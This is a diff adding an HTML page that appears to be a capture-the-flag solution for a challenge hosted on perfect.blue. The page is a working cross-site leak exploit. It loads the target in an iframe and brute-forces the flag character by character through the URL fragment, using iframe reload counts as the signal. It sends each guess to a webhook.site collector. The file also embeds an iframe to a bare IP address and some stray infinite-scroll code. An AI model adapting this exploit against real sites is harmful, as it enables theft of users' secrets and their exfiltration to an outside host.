@@ -1,0 +1,75 @@
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+<iframe id="frasfd" src="http://xsps.chal.perfect.blue/" title="test"></iframe> 
+
+<script>
+    window.onload = (event) => {
+  console.log("page is fully loaded");
+};
+
+async function demo() {
+
+    const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+
+let flag = "A";
+var timesRefreshed = 0;
+
+//detect iframe loading/refreshing
+$("iframe").on("load", function(){
+    timesRefreshed++;
+});
+fr2 = document.getElementById("frasfd");
+fr2.src = "http://xsps.chal.perfect.blue";
+await sleep(1000);
+while (true) {
+    for (var i = 0x30; i < 0xff; i++) {
+        timesRefreshed = 0;
+
+        let tempStr = flag + String.fromCharCode(i);
+        console.log(tempStr);
+        extra = btoa(JSON.stringify({open: true, query: tempStr}));
+        new_url = "http://xsps.chal.perfect.blue#" + extra;
+
+        fr2.src = new_url;
+        await sleep(500);
+        console.log(timesRefreshed);
+        if (timesRefreshed > 0) {
+            console.log(tempStr);
+            flag = tempStr;
+            fr2.src = "http://xsps.chal.perfect.blue";
+            await sleep(500);
+            break;
+        } 
+        fetch("https://webhook.site/bd328f39-8623-4dfd-b3f1-6e1c07c1937e?" + tempStr);
+    }
+}
+
+
+}
+
+
+demo();
+
+</script> 
+<iframe id="stoploading" src="https://216.206.238.106:8002/" title="test"></iframe> 
+
+<a>test</a>
+<script type="text/javascript">
+    function yHandler(){
+    var wrap = document.getElementById('wrap');
+    var contentHeight = wrap.offsetHeight;
+    var yOffset = window.pageYOffset; 
+    var y = yOffset + window.innerHeight;
+    if(y >= contentHeight){
+        // Ajax call to get more dynamic data goes here
+        wrap.innerHTML += '<div class="newData"></div>';
+        window.onscroll = null;
+    }
+    var status = document.getElementById('status');
+    status.innerHTML = contentHeight+" | "+y;
+     }
+     window.onscroll = yHandler;
+    </script>
+    
